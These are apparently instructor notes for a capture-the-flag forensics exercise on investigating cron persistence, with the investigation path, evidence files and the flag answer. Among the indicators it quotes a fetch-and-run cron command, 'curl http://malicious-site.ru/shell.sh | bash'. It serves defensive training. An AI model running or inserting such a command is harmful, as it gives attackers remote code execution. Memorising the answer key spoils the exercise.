# M5-04 Instructor Notes

## Objective
- Train learners to investigate cron persistence and extract suspicious domain IOC.
- Expected answer: `CTF{malicious-site.ru}`.

## Expected Investigation Path
1. Read `incident_ticket.txt` and `analyst_handoff.txt`:
   - incident: `INC-2026-5504`
   - host: `lin-app-03`
2. In `deploy_crontab_snapshot.txt`, identify suspicious recurring cron command.
3. In `cron_job_inventory.csv`, confirm same command entry and owner/source.
4. In `dns_query.log` and `proxy_egress.log`, verify domain resolution and fetch activity.
5. In `persistence_alerts.jsonl`, confirm alert field `suspicious_domain`.
6. In `timeline_events.csv`, confirm SIEM correlation and incident timeline.
7. Submit the suspicious domain.

## Key Indicators
- Cron pivot:
  - `curl http://malicious-site.ru/shell.sh | bash`
- DNS pivot:
  - `qname=malicious-site.ru`
- Proxy pivot:
  - `domain=malicious-site.ru uri=/shell.sh`
- Alert pivot:
  - `"type":"suspicious_cron_network_command"`
  - `"suspicious_domain":"malicious-site.ru"`
- SIEM pivot:
  - `malicious_cron_detected ... malicious-site.ru`

## Suggested Commands / Tools
- `rg "malicious-site.ru|curl|suspicious_domain|cron" evidence`
- Review:
  - `evidence/persistence/cron_job_inventory.csv`
  - `evidence/persistence/deploy_crontab_snapshot.txt`
  - `evidence/network/dns_query.log`
  - `evidence/network/proxy_egress.log`
